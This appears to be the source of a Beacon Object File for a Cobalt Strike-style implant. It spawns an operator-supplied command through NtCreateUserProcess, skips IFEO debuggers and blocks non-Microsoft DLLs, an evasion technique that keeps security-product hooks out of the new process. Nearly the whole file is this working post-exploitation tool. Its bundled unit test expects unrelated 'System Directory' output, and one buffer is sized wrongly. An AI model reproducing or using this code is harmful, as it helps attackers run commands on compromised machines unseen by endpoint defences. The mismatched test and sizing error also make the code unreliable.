#include <windows.h>
#include "base\helpers.h"
#include "imports.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
    // Map GetLastError to KERNEL32$GetLastError 
    #define GetLastError KERNEL32$GetLastError 

    VOID go(IN PCHAR Args, IN ULONG Length) {
        // Ensure valid input length
        if (Length == 0 || Args == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Invalid command input.");
            return;
        }

        // Parse arguments using BeaconDataExtract
        datap parser;
        BeaconDataParse(&parser, Args, Length);
        CHAR* extractedCmd = (CHAR*)BeaconDataExtract(&parser, NULL);

        if (!extractedCmd || extractedCmd[0] == '\0') {
            BeaconPrintf(CALLBACK_ERROR, "No valid command received.");
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "Received Arg: [%s]", extractedCmd);

        // Convert extracted ASCII command to UNICODE_STRING
        WCHAR wCmd[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, extractedCmd, -1, wCmd, MAX_PATH);

        UNICODE_STRING NtImagePath, Params, ImagePath;
        RtlInitUnicodeString(&ImagePath, wCmd);
        RtlInitUnicodeString(&NtImagePath, wCmd);
        RtlInitUnicodeString(&Params, wCmd);

        // Create the process parameters
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
        RtlCreateProcessParametersEx(
            &ProcessParameters, &ImagePath, NULL, NULL, &Params, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED
        );

        // Initialize PS_CREATE_INFO structure
        PS_CREATE_INFO CreateInfo = { 0 };
        CreateInfo.Size = sizeof(CreateInfo);
        CreateInfo.State = PsCreateInitialState;
        CreateInfo.InitState.u1.InitFlags = PsSkipIFEODebugger;

        // Allocate attribute list
        PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
        PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
        PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
        PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));

        if (!stdHandleInfo || !clientId || !SecImgInfo || !AttributeList) {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
            return;
        }

        AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
        AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
        AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
        AttributeList->Attributes[0].ValuePtr = clientId;

        AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
        AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
        AttributeList->Attributes[1].ValuePtr = SecImgInfo;

        AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        AttributeList->Attributes[2].Size = NtImagePath.Length;
        AttributeList->Attributes[2].ValuePtr = NtImagePath.Buffer;

        AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
        AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
        AttributeList->Attributes[3].ValuePtr = stdHandleInfo;

        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
        AttributeList->Attributes[4].Size = sizeof(DWORD64);
        AttributeList->Attributes[4].ValuePtr = &policy;

        // Create the process
        HANDLE hProcess = NULL, hThread = NULL;
        OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
        NTSTATUS status = NtCreateUserProcess(
            &hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, &objAttr, &objAttr, 0, 0, ProcessParameters, &CreateInfo, AttributeList
        );

        // Clean up
        if (hProcess) CloseHandle(hProcess);
        if (hThread) CloseHandle(hThread);
        RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
        RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
        RtlFreeHeap(RtlProcessHeap(), 0, clientId);
        RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
        RtlDestroyProcessParameters(ProcessParameters);
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif